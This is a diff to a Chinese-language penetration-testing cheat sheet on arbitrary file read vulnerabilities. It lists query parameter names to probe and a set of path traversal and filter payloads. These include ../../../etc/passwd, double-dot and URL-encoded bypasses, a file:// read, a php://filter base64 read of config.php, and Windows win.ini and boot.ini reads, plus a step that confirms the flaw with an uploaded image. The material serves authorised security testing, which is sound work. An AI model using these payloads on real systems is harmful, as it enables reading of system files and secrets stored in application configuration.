@@ -1,2 +1,32 @@
-get或者post参数中存在filepath参数，尝试././././././././etc/passwd或者已知web目录下存在的文件，
-比如自己传入的图片等文件。
+# 任意文件读取
+
+## 测试参数名
+```http
+?file=xxx
+?path=xxx
+?filepath=xxx
+?filename=xxx
+?download=xxx
+?src=xxx
+?page=xxx
+```
+
+## Payload
+```http
+file=../../../etc/passwd
+file=....//....//....//etc/passwd
+file=%2e%2e%2f%2e%2e%2fetc/passwd
+file=file:///etc/passwd
+file=php://filter/convert.base64-encode/resource=config.php
+
+# Windows
+file=..\..\..\windows\win.ini
+file=..\..\..\boot.ini
+```
+
+## 读取已知文件
+```
+通过上传功能先上传一张图片
+获取图片的 URL 路径
+尝试读取该文件确认存在任意文件读取漏洞
+```
